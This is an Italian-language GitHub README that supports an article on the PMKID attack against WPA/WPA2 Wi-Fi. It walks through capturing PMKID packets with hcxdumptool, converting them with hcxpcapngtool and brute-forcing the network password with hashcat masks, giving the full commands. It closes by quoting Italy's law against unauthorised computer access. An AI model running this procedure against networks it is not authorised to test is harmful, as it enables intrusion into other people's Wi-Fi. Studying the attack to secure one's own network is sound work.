# PMKID ATTACK

<div align="center">
 <img src="https://miro.medium.com/max/1354/1*D5RpNYKS1LzMb3sV8PMHbQ.png">
</div>

Questo repository è di supporto all'articolo riguardo il **PMKID ATTACK** disponibile [qui](https://medium.com/@mariocuomo/pmkid-attack-parte-1-9ae5433ea85e).<br>
L'articolo tra ispirazione dal [post](https://hashcat.net/forum/thread-7717.html) pubblicato il 4 agosto 2018 sul forum di **hashcat** riguardo una vulnerabilità nel protocollo Wi-Fi Protected Access (WPA e WPA2).


#### SCENARIO
Un Client che non è in possesso della password di un Access Point cerca di riceve un messaggio contenente un **PMKID** - una stringa cifrata il cui unico parametro ignoto è il **PMK**.<br>
Il **PMK** è generato a partire dalla password in chiaro e altre varibili note al Client.<br>
Conoscendo il processo generativo del PMK dalla password e quello del PMKID a partre dal PMK, il Client cerca di costruire un **PMKID*** a partire da password note.


#### TOOL NECESSARI
- [hcxdumptool](https://github.com/ZerBea/hcxdumptool), uno strumento che come suggerisce la descrizione del repository github è in grado di 'acquisire pacchetti da dispositivi wlan e scoprire potenziali punti deboli all'interno delle proprie reti WiFi'.<br>
È necessario quindi possedere una scheda wireless che supporti la _monitor mode_.
- [hcxtools](https://github.com/ZerBea/hcxtools), uno strumento che come suggerisce la descrizione del repository github permette di 'converti i pacchetti dalle acquisizioni per rilevare i punti deboli all'interno delle proprie reti WiFi analizzando gli hash'
- [hashcat](https://hashcat.net/hashcat/), uno strumento che implementa diversi algoritmi di cifratura e utilizzato per il recupero password


## PASSO 1 - INSTALLARE I VARI TOOL
È necessario clonare i repositori hcxdumptool e hcxtools.
```Bash
git clone https://github.com/ZerBea/hcxdumptool.git
cd hcxdumptool
make && make install

git clone https://github.com/ZerBea/hcxtools.git
cd hcxtools
make && make install
```

## PASSO 2 - IMPOSTARE LA PROPRIA SCHEDA IN MODALITÀ MONITOR
Uno strumento per impostare la propria interfaccia wireless in modalità monitor è [Airmon-ng](https://aircrack-ng.org/doku.php?id=it:install_aircrack)
```Bash
wget http://download.aircrack-ng.org/aircrack-ng-1.0.tar.gz
tar -zxvf aircrack-ng-1.0.tar.gz
cd aircrack-ng-1.0
make
make install
```

Se x è il nome della propria interfaccia - scopribile tramite il comando ```ifconfig``` - lanciare il comando 
```Bash
airmon-ng start x
```
Da questo momento il nome della interfaccia wireless avrà la forma x**mon**.<br>
Per avere una conferma rilanciare il comando ```ifconfig```.



## PASSO 3 - CATTURARE PACCHETTI DI INTERESSE
A questo punto è necessario catturare i pacchetti di interesse.<br>
Il comando minimale è il seguente, dove il parametro **-o** indica il file di output sul quale si scriverà e il parametro **-i** indica la sorgente dalla quale si cattureranno i pacchetti.

```Bash
hcxdumptool -o pacchetti.pcapng -i xmon 
```

Un parametro di interesse da aggiungere è **enable_status**.<br>
Questo parametro permette di specificare a quali pacchetti siamo interessati:<br>

**1**: EAPOL<br>
**2**: PROBEREQUEST/PROBERESPONSE<br>
**4**: AUTHENTICATON<br>
**8**: ASSOCIATION<br>

Siamo interessati ai pacchetti EAPOL.

```Bash
hcxdumptool -o pacchetti.pcapng -i xmon --enable_status=1
```

Il file creato può essere visualizzato con [wireshark](https://www.wireshark.org/).<br>
È possibile filtrare i pacchetti di interesse con il filtro wireshark ```eapol && wlan.rsn.ie.pmkid```

<div align="center">
 <img src="https://github.com/mariocuomo/PMKID/blob/main/resources/whireshark.png">
</div>

## PASSO 4 - CONVERTIRE IL FILE OUTPUT DI HCXDUMPTOOL
Il file .pcapng deve ora essere convertito in un formato comprensibile ad hashcat.<br>
In accordo a quanto previsto per la versione 6.2.5 di hashcat costruiamo un file con estensione .hc22000.

```Bash
 hcxpcapngtool -o hash.hc22000 -E wordlist pacchetti.pcapng
 ```
<div align="center">
 <img src="https://github.com/mariocuomo/PMKID/blob/main/resources/hcxpcapngtool.png">
</div>
 
## PASSO 5 - LANCIARE IL MECCANISMO DI BRUTEFORCE
Se si osserva il file appena creato esso segue la seguente forma:

**PROTOCOL** * **TYPE** * **PMKID/MIC** * **MACAP** * **MACCLIENT** * **ESSID** * **ANONCE** * **EAPOL** * **MESSAGEPAIR**

L'ESSID è espresso in esadecimale.<br>
Al solo titolo di esempio, si lanci il seguente script per decodificarli:

```Bash
awk -F "*" '{ system("echo " $6 " | xxd -r -p; echo" ) }' hash.hc22000
```
 
Si hanno tutte le informazioni necessarie per iniziare la computazione del PMKID.<br>
Come si è visto nell'articolo è necessario iniziare da una password, generare il PMK e successivamente il PMKID*.<br>
Ma da quali password iniziare?<br>
Si può utilizzare una lista di password candidate o si può esprimere una **mask**.<br>
Una mask descrive la struttura della passoword: si immagini di avere una password composta da 8 cifre decimali.<br>
Il comando è il seguente

```Bash
hashcat -m 22000 hash.hc22000 -a 3 -w 4 ?d?d?d?d?d?d?d?d
```

Il parametro -a indica l'hash type e il parametro -w indica il profilo di workload.

<div align="center">
 <img src="https://github.com/mariocuomo/PMKID/blob/main/resources/hashcat.png">
</div>

et voilà, tocca solamente attendere!

---

> **Art.615-ter. (Accesso abusivo ad un sistema informatico e telematico).<br>
> Chiunque abusivamente si introduce in un sistema informatico o telematico protetto da misure di sicurezza ovvero vi si mantiene contro la volontà espressa o tacita di chi ha il diritto di escluderlo, è punito con la reclusione fino a tre anni.**

---
